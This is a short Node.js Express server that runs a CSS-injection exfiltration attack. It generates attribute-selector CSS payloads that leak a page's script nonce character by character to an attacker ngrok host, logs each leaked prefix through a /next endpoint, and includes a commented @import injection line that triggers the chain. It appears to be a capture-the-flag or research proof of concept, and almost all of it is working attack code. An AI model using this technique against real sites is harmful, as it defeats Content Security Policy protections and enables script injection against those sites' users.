const express= require('express');
const fs = require("fs"); 
//const indexHtml = fs.readFileSync("./index.html").toString();
const app=express();

gen_payload=(curr,url)=>{
    letters='abcdefghijklmnopqrstuvwxyz0123456789'
    let p=''
    for(i=0;i<letters.length;i++){
        p+=`script[nonce^='${curr+letters[i]}']{background:url("//${url}?next=${curr+letters[i]}");display : block}\n`
        
    }
    return p;
}

//<style>@import url(http://d121-103-170-54-205.ngrok.io/);</style>
let p=''
app.get('/', (req, res)=>{                               
    res.setHeader("Content-Type","text/css");
    css=gen_payload(p||'','//d121-103-170-54-205.ngrok.io/next');
    res.send(css);

}); 
app.get('/p',(req,res)=>{res.send(p)}) 
app.get('/next',(req,res)=>{
    p=req.query.next;
    console.log(p);
    res.end();

    
})
//gen_payload('');
app.get('/index',(req,res)=>{
    res.setHeader("Content-Type","text/html");
    res.send(fs.readFileSync("./nonce.html").toString())
})
app.listen(9000,()=>{
    console.log("server started")
})